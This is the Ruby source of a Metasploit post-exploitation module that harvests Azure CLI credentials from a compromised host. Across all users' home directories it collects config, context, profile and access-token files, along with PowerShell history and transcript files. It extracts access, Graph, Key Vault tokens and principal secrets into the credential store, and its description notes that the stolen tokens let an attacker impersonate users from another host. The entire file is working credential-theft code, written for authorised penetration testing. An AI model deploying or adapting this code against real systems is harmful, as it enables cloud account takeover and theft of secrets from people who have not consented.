##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Azure

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Azure CLI Credentials Gatherer',
        'Description' => %q{
          This module will collect the Azure CLI 2.0+ (az cli) settings files
          for all users on a given target. These configuration files contain
          JWT tokens used to authenticate users and other subscription information.
          Once tokens are stolen from one host, they can be used to impersonate
          the user from a different host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'James Otten <jamesotten1[at]gmail.com>', # original author
          'h00die' # additions
        ],
        'Platform' => ['win', 'linux', 'osx'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def rep_creds(user, pass, type)
    create_credential_and_login({
      # must have an IP address, can't be a domain...
      address: '13.107.246.69', # 'portal.azure.com' https://www.nslookup.io/domains/portal.azure.com/dns-records/ June 24, 2024
      port: 443,
      protocol: 'tcp',
      workspace_id: myworkspace_id,
      origin_type: :service,
      private_type: :password, # most are actually JWT (cookies?) but thats not an option
      private_data: pass,
      service_name: "azure: #{type}",
      module_fullname: fullname,
      username: user,
      status: Metasploit::Model::Login::Status::UNTRIED
    })
  end

  def parse_json(data)
    data.strip!
    # remove BOM, https://www.qvera.com/kb/index.php/2410/csv-file-the-start-the-first-header-column-name-can-remove-this
    data.gsub!("\xEF\xBB\xBF", '')
    json_blob = nil
    begin
      json_blob = JSON.parse(data)
    rescue ::JSON::ParserError => e
      print_error("Unable to parse json blob: #{e}")
    end
    json_blob
  end

  def user_dirs
    user_dirs = []
    if session.platform == 'windows'
      grab_user_profiles.each do |profile|
        user_dirs.push(profile['ProfileDir'])
      end
    elsif session.platform == 'linux' || session.platform == 'osx'
      user_dirs = enum_user_directories
    else
      fail_with(Failure::BadConfig, 'Unsupported platform')
    end
    user_dirs
  end

  def get_az_version
    command = 'az --version'
    command = "powershell.exe #{command}" if session.platform == 'windows'
    version_output = cmd_exec(command, 60)
    # https://rubular.com/r/IKvnY4f15Rfujx
    version_output.match(/azure-cli\s+\(?([\d.]+)\)?/)
  end

  def run
    version = get_az_version
    if version.nil?
      print_status('Unable to determine az cli version')
    else
      print_status("az cli version: #{version[1]}")
    end
    profile_table = Rex::Text::Table.new(
      'Header' => 'Subscriptions',
      'Indent' => 1,
      'Columns' => ['Account Name', 'Username', 'Cloud Name']
    )
    tokens_table = Rex::Text::Table.new(
      'Header' => 'Tokens',
      'Indent' => 1,
      'Columns' => ['Source', 'Username', 'Count']
    )
    context_table = Rex::Text::Table.new(
      'Header' => 'Context',
      'Indent' => 1,
      'Columns' => ['Username', 'Account Type', 'Access Token', 'Graph Access Token', 'MS Graph Access Token', 'Key Vault Token', 'Principal Secret']
    )

    user_dirs.map do |user_directory|
      vprint_status("Looking for az cli data in #{user_directory}")
      # leaving all these as lists for consistency and future expansion

      # ini file content, not json.
      vprint_status('  Checking for config files')
      %w[.azure/config].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        # we would prefer readable?, but windows doesn't support it, so avoiding
        # an extra code branch, just handle read errors later on

        data = read_file(possible_location)
        next unless data

        # https://stackoverflow.com/a/16088751/22814155 no ini ctype
        loot = store_loot 'azure.config.ini', 'text/plain', session, data, file_location, 'Azure CLI Config'
        print_good "    #{file_location} stored in #{loot}"
      end

      vprint_status('  Checking for context files')
      %w[.azure/AzureRmContext.json].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.context.json', 'text/json', session, data, file_location, 'Azure CLI Context'
        print_good "    #{file_location} stored in #{loot}"
        data = parse_json(data)
        next if data.nil?

        results = process_context_contents(data)
        results.each do |result|
          context_table << result
          next if result[0].blank?
          next unless framework.db.active

          rep_creds(result[0], result[2], 'Access Token') unless result[2].blank?
          rep_creds(result[0], result[3], 'Graph Access Token') unless result[3].blank?
          rep_creds(result[0], result[4], 'MS Graph Access Token') unless result[4].blank?
          rep_creds(result[0], result[5], 'Key Vault Token') unless result[5].blank?
          rep_creds(result[0], result[6], 'Principal Secret') unless result[6].blank?
        end
      end

      vprint_status('  Checking for profile files')
      %w[.azure/azureProfile.json].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.profile.json', 'text/json', session, data, file_location, 'Azure CLI Profile'
        print_good "    #{file_location} stored in #{loot}"
        data = parse_json(data)
        next if data.nil?

        results = process_profile_file(data)
        results.each do |result|
          profile_table << result
        end
      end

      %w[.azure/accessTokens.json].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.token.json', 'text/json', session, data, file_location, 'Azure CLI Tokens'
        print_good "    #{file_location} stored in #{loot}"
        results = process_tokens_file(data)
        results.each do |result|
          tokens_table << result
        end
      end

      # windows only
      next unless session.platform == 'windows'

      vprint_status('  Checking for console history files')
      %w[AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.console_history.txt', 'text/plain', session, data, possible_location, 'Azure CLI Profile'
        print_good "    #{possible_location} stored in #{loot}"

        results = print_consolehost_history(data)
        results.each do |result|
          print_good(result)
        end
      end

      # https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.host/start-transcript?view=powershell-7.4#description
      vprint_status('  Checking for powershell transcript files')

      # Post failed: Rex::Post::Meterpreter::RequestError stdapi_fs_ls: Operation failed: Access is denied.
      begin
        files = dir("#{user_directory}/Documents")
      rescue Rex::Post::Meterpreter::RequestError
        files = []
      end

      files.each do |file_name|
        next unless file_name =~ /PowerShell_transcript\.[\w_]+\.[^.]+\.\d+\.txt/

        possible_location = "#{user_directory}/Documents/#{file_name}"
        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.transcript.txt', 'text/plain', session, data, possible_location, 'Powershell Transcript'
        print_good "    #{possible_location} stored in #{loot}"

        results = print_consolehost_history(data)
        results.each do |result|
          print_good(result)
        end
      end
    end

    print_good(profile_table.to_s) unless profile_table.rows.empty?
    print_good(tokens_table.to_s) unless tokens_table.rows.empty?
    print_good(context_table.to_s) unless context_table.rows.empty?
  end
end
